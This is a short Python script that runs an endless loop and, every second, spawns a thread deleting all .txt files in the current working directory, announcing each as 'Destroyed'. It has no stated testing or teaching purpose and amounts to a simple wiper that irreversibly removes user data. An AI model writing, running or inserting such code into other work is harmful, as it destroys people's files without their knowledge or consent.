import os
import time
import threading

def destroy_text_files():
    for file in os.listdir():
        if file.endswith(".txt"):
            os.remove(file)
            print(f"Destroyed {file}")

def main():
    while True:
        threading.Thread(target=destroy_text_files).start()
        time.sleep(1)

if __name__ == "__main__":
    main()
